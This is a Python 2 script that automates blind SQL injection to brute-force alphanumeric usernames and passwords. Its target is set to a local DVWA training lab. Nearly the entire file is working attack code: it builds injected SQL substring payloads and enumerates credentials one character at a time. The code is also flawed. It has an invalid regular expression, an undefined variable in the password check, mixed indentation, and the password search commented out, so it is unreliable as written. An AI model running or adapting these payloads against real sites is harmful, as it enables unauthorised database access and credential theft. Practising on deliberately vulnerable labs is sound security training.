# Author: Charles Leavitt
# file: SQLinject.py
# brute force MySQL injects for alphanumerical usernames and passwords

import requests
from bs4 import BeautifulSoup
from bs4 import Comment
import string
import re
import os

upper = string.ascii_uppercase
lower = string.ascii_lowercase
letters = lower + upper
digits = string.digits
alphanum = letters + digits

# Set this to the address of the target: 
addr = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
# Check value: regex of valid output:
validstr = '*User ID exists in the database*'

# some field names to inject:
field1 = 'id'
field2 = 'password'
# Maximum length of username or password:
maxlen = 10

# arrays to hold values: 
users= []
subs = []
passwords = []
userpass = []

# checks the user field for valid substrings
def checkUser(user):
	snum = str(len(user))
	suser = str(user)
	param = {field1:'\' or binary substring('+field1+',1,'+snum+') = \"'+suser+'\" -- \"',}
	print "params: ", param	
	r = requests.post(addr, data=param)
	print "print r ", r
	bsObj = BeautifulSoup(r.text, "lxml")
	print bsObj
	message = bsObj.find('div', {'class':'vulnerable_code_area'})
	print message	
	print("message recv:", message.text)
	if re.search('*User ID exists in the database*', message.text):
		return True
	else:
		return False

# checks if a user and password substring is valid
def checkPass(user, pwrd):
	snum = str(len(pwrd))
	spwrd = str(pwrd)
	param = {field1:'\' or ('+field1+' = \"'+user+'\" and binary substring(password,1,'+snum+') = \"'+spwrd+'\") -- \"',}
	r = requests.post(addr, data=param)
	bsObj = BeautifulSoup(r.text)
	message = bsObj.find('div', {'class':'message'})
	#print("message recv:", message.text)
	if re.search(strvalid, message.text):
		return True
	else:
		return False

# checks if a user substring is a valid user
def verifyUser(user):
	snum = str(len(user))
	suser = str(user)
	param = {field1: '\' or '+field1+' = \"'+user+'\" -- \"',}
	r = requests.post(addr, data=param)
	bsObj = BeautifulSoup(r.text)
	message = bsObj.find('div', {'class':'vulnerable_code_area'}) # was message
	#print("message recv:", message.text)
	if re.search(validstr, message.text):
		return True
	else:
		return False

# checks if a user:password pair is valid
def verifyUserPass(u,p):
	param = {field1:u,field2:p}
	r = requests.post(addr, data=param)
	bsObj = BeautifulSoup(r.text)
	message = bsObj.find('div', {'class':'message'})
	#print("message recv:", message.text)
	if re.search(validstr, message.text):
		return True
	else:
		return False

# This is the logic to generate and check all possible usernames
def findUsers():
	first = []
	for a in alphanum:
			if checkUser(a):
				first.append(a)
	subs1 = []
	for i in first:
		subs.append(i)		
		subs1.append(i)
	#print subs1	
	for u in subs1:
 		attempt = u	
		while len(attempt) <= maxlen:
			#print attempt
			test = attempt		
			for u in alphanum:
				if checkUser(attempt + str(u)):
					subs.append(attempt + str(u))
					attempt = attempt + str(u)
			if attempt == test:
				break
	#checking if the substrings are valid users
	for i in subs:
		if verifyUser(i):
			users.append(i)

# this finds all the the possible password substrings 
def findPass():
	for u in users:	
		first = []
		for a in alphanum:
				if checkPass(u,a):
					first.append(a)
		pass1 = []
		for i in first:
			passwords.append(i)
			pass1.append(i)
		#print pass1	
		for p in pass1:
	 		attempt = p	
			while len(attempt) <= maxlen:
				#print attempt
				test = attempt		
				for c in alphanum:
					if checkPass(u, attempt + str(c)):
						passwords.append(attempt + str(c))
						attempt = attempt + str(c)
				if attempt == test:
					break
		# checks all users against all password substrings
		for u in users:
			for p in passwords:
				if verifyUserPass(u,p):
					userpass.append(u+':'+p)

# main: 
print("Brute forcing users...")
findUsers()						
print("Users found: ", users)

print("\nBrute forcing passwords...")
#findPass()
userpass = sorted(set(userpass))
print("\nFound user:password pairs:\n")
for i in userpass:
	print('\t'+i)
print('\nFinished...Have nice day!')

